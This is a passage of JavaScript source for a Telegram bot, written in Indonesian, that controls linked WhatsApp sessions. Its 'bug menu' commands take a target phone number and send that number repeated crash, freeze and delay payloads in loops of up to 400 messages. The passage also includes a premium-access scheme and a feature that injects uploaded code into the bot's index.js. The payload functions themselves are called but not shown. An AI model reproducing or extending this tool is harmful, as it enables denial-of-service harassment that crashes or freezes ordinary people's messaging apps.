      const fileId = msg.reply_to_message.document.file_id;
      const fileName = msg.reply_to_message.document.file_name;
      
      if (!fileName.endsWith('.js')) {
        await bot.sendMessage(chatId, "❌ File harus berekstensi .js");
        return;
      }
      
      source = "file";
      await bot.sendMessage(chatId, `🔄 Memproses file ${fileName}...`);
      
      try {
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'text' });
        functionBody = response.data.trim();
      } catch (error) {
        await bot.sendMessage(chatId, `❌ Gagal membaca file: ${error.message}`);
        return;
      }
      
    } else if (msg.reply_to_message.text) {
      source = "text";
      functionBody = msg.reply_to_message.text.trim();
      await bot.sendMessage(chatId, `🔄 Memproses fungsi dari pesan teks...`);
    }
  }
  
  if (!functionBody) {
    await bot.sendMessage(chatId, "❌ Reply ke file .js ATAU ke pesan teks yang berisi fungsi!\n\nKirim file .js atau tulis fungsi, lalu reply dengan /addfunccmd");
    return;
  }
  
  if (!functionBody.includes(`async function ${functionName}`) && !functionBody.includes(`function ${functionName}`)) {
    await bot.sendMessage(chatId, `❌ Fungsi dengan nama "${functionName}" tidak ditemukan di ${source === "file" ? "file" : "pesan"}!\n\nPastikan berisi:\nasync function ${functionName}(sock, target) { ... }`);
    return;
  }
  
  if (!functionBody.includes('async function')) {
    functionBody = `async ${functionBody}`;
  }
  
  const functionAdded = await addNewFunctionToFile(functionBody, functionName);
  
  if (!functionAdded) {
    await bot.sendMessage(chatId, `⚠️ Gagal menambah fungsi atau fungsi "${functionName}" sudah ada di index.js.`);
  } else {
    await bot.sendMessage(chatId, `✅ Fungsi "${functionName}" berhasil ditambahkan ke index.js!`);
  }
  
  const commandAdded = await addNewCommand(cmdName, loopCount, sleepMs, functionName);
  
  if (!commandAdded) {
    await bot.sendMessage(chatId, `❌ Gagal menambah command /${cmdName}.`);
    return;
  }
  
  await bot.sendMessage(chatId, `✅ BERHASIL MENAMBAH COMMAND BARU!
  
📌 Command: /${cmdName}
🔄 Loop: ${loopCount}x
⏱️ Sleep: ${sleepMs}ms
⚡ Function: ${functionName}
📁 Source: ${source}

🔄 Restarting bot dalam 3 detik...`);
  
  setTimeout(() => {
    process.exit(0);
  }, 3000);
});

// ================= FITUR BARU ================= //

// Fitur /fullupdate
bot.onText(/\/fullupdate/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  await performFullUpdate(chatId);
});

// Fitur /cekupdate
bot.onText(/\/cekupdate/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
    return;
  }
  
  try {
    await bot.sendMessage(chatId, "🔍 Memeriksa update dari GitHub...");
    
    const updateCheck = await checkGitHubUpdate();
    
    if (updateCheck.error) {
      await bot.sendMessage(chatId, `❌ Gagal memeriksa update: ${updateCheck.error}`);
      return;
    }
    
    if (updateCheck.hasUpdate) {
      const localStats = fs.statSync(__filename);
      const localSize = (localStats.size / 1024).toFixed(2);
      const remoteSize = (updateCheck.remoteContent.length / 1024).toFixed(2);
      
      await bot.sendMessage(chatId, `✅ UPDATE TERSEDIA!
      
📦 Ukuran lokal: ${localSize} KB
📦 Ukuran remote: ${remoteSize} KB

Gunakan /fullupdate untuk mengupdate bot.`);
    } else {
      await bot.sendMessage(chatId, "✅ Bot sudah versi terbaru. Tidak ada update.");
    }
  } catch (error) {
    console.error("Error in cekupdate:", error);
    await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// Fitur /onlygb <on/off>
bot.onText(/\/onlygb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const mode = match[1].toLowerCase();
  if (mode === "on") {
    saveGroupOnly("on");
    groupOnly = { mode: "on" };
    await bot.sendMessage(chatId, "✅ Mode Group Only: ON (bot hanya merespon di grup)");
  } else if (mode === "off") {
    saveGroupOnly("off");
    groupOnly = { mode: "off" };
    await bot.sendMessage(chatId, "✅ Mode Group Only: OFF (bot merespon di grup & private)");
  } else {
    await bot.sendMessage(chatId, "❌ Gunakan: /onlygb on atau /onlygb off");
  }
});

// Fitur /mode <on/off>
bot.onText(/\/mode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const mode = match[1].toLowerCase();
  if (mode === "on") {
    saveBotMode("on");
    botMode = { mode: "on" };
    await bot.sendMessage(chatId, "✅ Maintenance Mode: ON (hanya owner yang bisa akses)");
  } else if (mode === "off") {
    saveBotMode("off");
    botMode = { mode: "off" };
    await bot.sendMessage(chatId, "✅ Maintenance Mode: OFF (semua user bisa akses)");
  } else {
    await bot.sendMessage(chatId, "❌ Gunakan: /mode on atau /mode off");
  }
});

// Fitur /stopcmd <command>
bot.onText(/\/stopcmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  let command = match[1].toLowerCase().replace("/", "");
  let blocked = loadBlockedCommands();
  
  if (!blocked.includes(command)) {
    blocked.push(command);
    saveBlockedCommands(blocked);
    await bot.sendMessage(chatId, `✅ Command /${command} telah di-block`);
  } else {
    await bot.sendMessage(chatId, `⚠️ Command /${command} sudah dalam daftar block`);
  }
});

// Fitur /runcmd <command>
bot.onText(/\/runcmd (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  let command = match[1].toLowerCase().replace("/", "");
  let blocked = loadBlockedCommands();
  
  if (blocked.includes(command)) {
    blocked = blocked.filter(cmd => cmd !== command);
    saveBlockedCommands(blocked);
    await bot.sendMessage(chatId, `✅ Command /${command} telah di-unblock`);
  } else {
    await bot.sendMessage(chatId, `⚠️ Command /${command} tidak ada dalam daftar block`);
  }
});

// ================= FITUR MENU DISCO ================= //

let activeMenuInterval = null;
let activeMenuMessageId = null;
let activeMenuChatId = null;
let currentStep = 1;
let stepStartTime = 0;

// Step 1: Primary, Success, Danger colors
const step1Styles = ["primary", "success", "danger"];
let step1Index = 0;

// Step 2: Emoji color list
const step2Emojis = ["🔴","🟥","❤️","🟠","🟧","🧡","🟡","🟨","💛","🟢","🟩","💚","🔵","🟦","💙","🟣","🟪","💜","🟤","🟫","⚫","⬛","⚪","⬜","🤍","🤎","🖤","🩷","🩵","🩶"];

// Step 3: Free emoji list
const step3Emojis = ["🌸","⭐","✨","🔥","💀","👾","🎯","💎","⚡","🌀","🌈","🍁","🎨","🕹️","🎭","🔮","💊","🧬","🦠","🤖","👻","🎃","🕯️","🔪","💣","🔫","🏹","🛡️","💰","👑","🎖️","🏆","🎪","🎭","📀","💿","📼","🔋","💡","🧲","⚙️","🔧","🛠️","🔨","⛏️","🧨","🎲","♟️","🧩","🎁","🧸","🪄","🔮","📿","🧿","🪬","💎"];

function getMainKeyboard(step, subStep = 0) {
  let button1Text, button2Text;
  const now = Date.now();
  
  if (step === 1) {
    const style = step1Styles[step1Index % step1Styles.length];
    button1Text = `バグメニュー 🦠🇯🇵`;
    button2Text = `オーナーメニュー 🔒🇯🇵`;
    
    if (now - stepStartTime >= 10000) {
      step = 2;
      currentStep = 2;
      stepStartTime = now;
      step1Index = 0;
    } else {
      step1Index++;
    }
  }
  
  if (step === 2) {
    const emoji = step2Emojis[subStep % step2Emojis.length];
    button1Text = `${emoji} バグメニュー 🦠🇯🇵`;
    button2Text = `${emoji} オーナーメニュー 🔒🇯🇵`;
    
    if (now - stepStartTime >= 10000) {
      step = 3;
      currentStep = 3;
      stepStartTime = now;
    }
  }
  
  if (step === 3) {
    const emoji = step3Emojis[subStep % step3Emojis.length];
    button1Text = `${emoji} バグメニュー 🦠🇯🇵`;
    button2Text = `${emoji} オーナーメニュー 🔒🇯🇵`;
    
    if (now - stepStartTime >= 10000) {
      step = 1;
      currentStep = 1;
      stepStartTime = now;
      step1Index = 0;
    }
  }
  
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: button1Text, callback_data: "bugmenu" },
          { text: button2Text, callback_data: "ownermenu" }
        ]
      ]
    }
  };
}

function getBugMenuKeyboard(step, subStep = 0) {
  const buttons = [
    ["🔰 /sanjiva", "⚡ /sanjixa"],
    ["❄️ /xfrozen", "💀 /stunt"],
    ["📌 /stuck", "🌀 /streak"],
    ["◀️ Kembali ke Menu", ""]
  ];
  
  let emoji;
  if (step === 1) {
    const style = step1Styles[step1Index % step1Styles.length];
    return {
      reply_markup: {
        inline_keyboard: buttons.map(row => 
          row.map(btn => {
            if (btn === "◀️ Kembali ke Menu") {
              return { text: btn, callback_data: "back_to_main" };
            }
            return { text: btn, callback_data: `cmd_${btn.replace(/[^a-zA-Z]/g, '')}` };
          }).filter(Boolean)
        )
      }
    };
  } else if (step === 2) {
    emoji = step2Emojis[subStep % step2Emojis.length];
  } else {
    emoji = step3Emojis[subStep % step3Emojis.length];
  }
  
  return {
    reply_markup: {
      inline_keyboard: buttons.map(row => 
        row.map(btn => {
          if (btn === "◀️ Kembali ke Menu") {
            return { text: `${emoji} ${btn}`, callback_data: "back_to_main" };
          }
          const cleanBtn = btn.replace(/[^a-zA-Z]/g, '');
          return { text: `${emoji} ${btn}`, callback_data: `cmd_${cleanBtn}` };
        }).filter(Boolean)
      )
    }
  };
}

function getOwnerMenuKeyboard(step, subStep = 0) {
  const buttons = [
    ["➕ /addbot", "👑 /addowner"],
    ["⭐ /addprem", "❌ /delowner"],
    ["❌ /delprem", "🔧 /mode"],
    ["👥 /onlygb", "🛑 /stopcmd"],
    ["▶️ /runcmd", "🔄 /fullupdate"],
    ["📡 /cekupdate", "➕ /addfunccmd"],
    ["⚙️ /updatecmd", "◀️ Kembali ke Menu"]
  ];
  
  let emoji;
  if (step === 1) {
    const style = step1Styles[step1Index % step1Styles.length];
    return {
      reply_markup: {
        inline_keyboard: buttons.map(row => 
          row.map(btn => {
            if (btn === "◀️ Kembali ke Menu") {
              return { text: btn, callback_data: "back_to_main" };
            }
            return { text: btn, callback_data: `cmd_${btn.replace(/[^a-zA-Z]/g, '')}` };
          }).filter(Boolean)
        )
      }
    };
  } else if (step === 2) {
    emoji = step2Emojis[subStep % step2Emojis.length];
  } else {
    emoji = step3Emojis[subStep % step3Emojis.length];
  }
  
  return {
    reply_markup: {
      inline_keyboard: buttons.map(row => 
        row.map(btn => {
          if (btn === "◀️ Kembali ke Menu") {
            return { text: `${emoji} ${btn}`, callback_data: "back_to_main" };
          }
          const cleanBtn = btn.replace(/[^a-zA-Z]/g, '');
          return { text: `${emoji} ${btn}`, callback_data: `cmd_${cleanBtn}` };
        }).filter(Boolean)
      )
    }
  };
}

let currentMenuType = "main";
let currentSubStep = 0;

async function startDiscoMenu(chatId, messageId, menuType = "main") {
  if (activeMenuInterval) {
    clearInterval(activeMenuInterval);
    activeMenuInterval = null;
  }
  
  activeMenuChatId = chatId;
  activeMenuMessageId = messageId;
  currentMenuType = menuType;
  currentSubStep = 0;
  stepStartTime = Date.now();
  currentStep = 1;
  step1Index = 0;
  
  activeMenuInterval = setInterval(async () => {
    try {
      currentSubStep++;
      
      let keyboard;
      if (currentMenuType === "main") {
        keyboard = getMainKeyboard(currentStep, currentSubStep);
      } else if (currentMenuType === "bug") {
        keyboard = getBugMenuKeyboard(currentStep, currentSubStep);
      } else {
        keyboard = getOwnerMenuKeyboard(currentStep, currentSubStep);
      }
      
      await bot.editMessageReplyMarkup(keyboard.reply_markup, {
        chat_id: chatId,
        message_id: messageId
      });
      
    } catch (err) {
      if (err.response?.body?.error_code !== 400) {
        console.log("Disco error:", err.message);
      }
    }
  }, 2500);
}

function stopDiscoMenu() {
  if (activeMenuInterval) {
    clearInterval(activeMenuInterval);
    activeMenuInterval = null;
  }
  activeMenuChatId = null;
  activeMenuMessageId = null;
}

// ================= BOT COMMANDS ================= //

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  const menuText = `╭═════════════════❀
│   ⚘ PRIMROSE LOTUS BOT ⚘
╰═════════════════❀
╭═════════════════❀
│  ⚘ SELAMAT DATANG ⚘
│═════════════════❀
│  Silakan pilih menu di bawah
╰═════════════════❀`;
  
  const sentMsg = await bot.sendMessage(chatId, menuText, {
    parse_mode: "HTML",
    ...getMainKeyboard(1, 0)
  });
  
  if (activeMenuInterval) {
    stopDiscoMenu();
  }
  
  startDiscoMenu(chatId, sentMsg.message_id, "main");
});

// Action handlers untuk menu
bot.on("callback_query", async (callbackQuery) => {
  const action = callbackQuery.data;
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const userId = callbackQuery.from.id;
  
  if (action === "bugmenu") {
    stopDiscoMenu();
    
    const bugMenuText = `╭═════════════════❀
│   ⚘ BUG MENU ⚘
╰═════════════════❀
╭═════════════════❀
│  ❀ /sanjiva <number> - delay invis brutality combo
│  ❀ /sanjixa <number> - delay invis hard
│  ❀ /xfrozen <number> - freeze invisible 
│  ❀ /stunt <number> - order secret spam
│  ❀ /stuck <number> - fc invis msg andro
│  ❀ /streak <number> - crash spam
╰═════════════════❀`;
    
    try {
      await bot.editMessageText(bugMenuText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      });
      
      startDiscoMenu(chatId, messageId, "bug");
      
      await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {}
    
  } else if (action === "ownermenu") {
    stopDiscoMenu();
    
    const ownerMenuText = `╭═════════════════❀
│   ⚘ OWNER MENU ⚘
╰═════════════════❀
╭═════════════════❀
│  ❀ /addbot <number>
│  ❀ /addowner <userId>
│  ❀ /addprem <userId> 
│  ❀ /delowner <userId>
│  ❀ /delprem <userId>
│  ❀ /onlygb on/off
│  ❀ /mode on/off
│  ❀ /stopcmd <command>
│  ❀ /runcmd <command>
│  ❀ /fullupdate
│  ❀ /cekupdate
│  ❀ /addfunccmd
│  ❀ /updatecmd
╰═════════════════❀`;
    
    try {
      await bot.editMessageText(ownerMenuText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      });
      
      startDiscoMenu(chatId, messageId, "owner");
      
      await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {}
    
  } else if (action === "back_to_main") {
    stopDiscoMenu();
    
    const mainText = `╭═════════════════❀
│   ⚘ PRIMROSE LOTUS BOT ⚘
╰═════════════════❀
╭═════════════════❀
│  ⚘ SELAMAT DATANG ⚘
│═════════════════❀
│  Silakan pilih menu di bawah
╰═════════════════❀`;
    
    try {
      await bot.editMessageText(mainText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML"
      });
      
      startDiscoMenu(chatId, messageId, "main");
      
      await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {}
    
  } else if (action.startsWith("cmd_")) {
    const cmd = action.replace("cmd_", "");
    let cmdName = "";
    
    if (cmd === "sanjiva") cmdName = "sanjiva";
    else if (cmd === "sanjixa") cmdName = "sanjixa";
    else if (cmd === "xfrozen") cmdName = "xfrozen";
    else if (cmd === "stunt") cmdName = "stunt";
    else if (cmd === "stuck") cmdName = "stuck";
    else if (cmd === "streak") cmdName = "streak";
    else if (cmd === "addbot") cmdName = "addbot";
    else if (cmd === "addowner") cmdName = "addowner";
    else if (cmd === "addprem") cmdName = "addprem";
    else if (cmd === "delowner") cmdName = "delowner";
    else if (cmd === "delprem") cmdName = "delprem";
    else if (cmd === "mode") cmdName = "mode";
    else if (cmd === "onlygb") cmdName = "onlygb";
    else if (cmd === "stopcmd") cmdName = "stopcmd";
    else if (cmd === "runcmd") cmdName = "runcmd";
    else if (cmd === "fullupdate") cmdName = "fullupdate";
    else if (cmd === "cekupdate") cmdName = "cekupdate";
    else if (cmd === "addfunccmd") cmdName = "addfunccmd";
    else if (cmd === "updatecmd") cmdName = "updatecmd";
    
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: `Command /${cmdName} - Ketik manual dengan nomor target`,
      show_alert: false
    });
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("sanjiva", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ sanjiva (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 10; i++) {
      await delaynewinvisibleVnX(sock, target);
      await sleep(2);
      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in sanjiva:", error);
  }
});

bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("xtest", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ xtest (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 400; i++) {
      await StickerFC(sock, target);
      await sleep(2000);
      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in xtest:", error);
  }
});

bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("sanjixa", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ sanjixa (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 3; i++) {
      await VsxCrashDelay(sock, target);
      await sleep(300);
      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in sanjixa:", error);
  }
});

bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("xfrozen", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ xfrozen (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 300; i++) {
      await Freeze(sock, target);
      await sleep(3000);
      console.log(chalk.green(`✅ Success Sending Frezee to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in xfrozen:", error);
  }
});

bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("stuck", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ stuck (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    await invisfcmsg(sock, target);
    await sleep(2000);
    
    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
    
  } catch (error) {
    console.error("Error in stuck:", error);
  }
});

bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("stunt", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ stunt (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    for (let i = 0; i < 60; i++) {
      await OrderSecret(sock, target);
      await sleep(1000);
      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
    }
    
  } catch (error) {
    console.error("Error in stunt:", error);
  }
});

bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  if (checkCommandBlocked("streak", msg)) {
    return;
  }
  
  if (!isOwner(userId) && !isPremium(userId)) {
    return;
  }

  if (!match[1]) {
    return;
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return;
    }

    const sock = sessions.values().next().value;
    
    await bot.sendMessage(chatId, `✅ streak (bug) selesai untuk ${formattedNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
    
    await VisiNoob(sock, target);
    
    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
    
  } catch (error) {
    console.error("Error in streak:", error);
  }
});

// Menu command untuk mengirim menu disco
bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botModeData = loadBotMode();
  const groupOnlyData = loadGroupOnly();
  
  if (botModeData.mode === "on" && !isOwner(userId)) {
    return;
  }
  
  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
    return;
  }
  
  const menuText = `╭═════════════════❀
│   ⚘ PRIMROSE LOTUS BOT ⚘
╰═════════════════❀
╭═════════════════❀
│  ⚘ SELAMAT DATANG ⚘
│═════════════════❀
│  Silakan pilih menu di bawah
╰═════════════════❀`;
  
  const sentMsg = await bot.sendMessage(chatId, menuText, {
    parse_mode: "HTML",
    ...getMainKeyboard(1, 0)
  });
  
  if (activeMenuInterval) {
    stopDiscoMenu();
  }
  
  startDiscoMenu(chatId, sentMsg.message_id, "main");
});

const mainMenuButtonsForMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "This Lotus", url: "t.me/ItsMeXanderRzMd" }],
      [{ text: "Channel Info", url: "t.me/allteamlinux" }]
    ],
  },
};

function checkAndGetImagePath(imageName) {
  const imagePath = path.join(__dirname, "assets", "images", imageName);
  if (!fs.existsSync(imagePath)) {
    return null;
  }
  return imagePath;
}

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      await bot.sendMessage(chatId, `⚠️ User ${userId} sudah premium.`);
      return;
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);
    await bot.sendMessage(chatId, `✅ User ${userId} ditambahkan ke premium.`);
  } catch (error) {
    console.error("Error adding premium user:", error);
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      await bot.sendMessage(chatId, `⚠️ User ${userId} tidak ditemukan di premium.`);
      return;
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);
    await bot.sendMessage(chatId, `✅ User ${userId} dihapus dari premium.`);
  } catch (error) {
    console.error("Error removing premium user:", error);
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";

    if (config.OWNER_ID.includes(newOwnerId)) {
      await bot.sendMessage(chatId, `⚠️ User ${newOwnerId} sudah menjadi owner.`);
      return;
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);
    await bot.sendMessage(chatId, `✅ User ${newOwnerId} ditambahkan sebagai owner.`);
  } catch (error) {
    console.error("Error adding owner:", error);
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return;
  }
  
  const botModeData = loadBotMode();
  if (botModeData.mode === "on" && !isOwner(msg.from.id)) {
    return;
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      await bot.sendMessage(chatId, `⚠️ User ${ownerIdToRemove} tidak ditemukan sebagai owner.`);
      return;
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);
    await bot.sendMessage(chatId, `✅ User ${ownerIdToRemove} dihapus dari owner.`);
  } catch (error) {
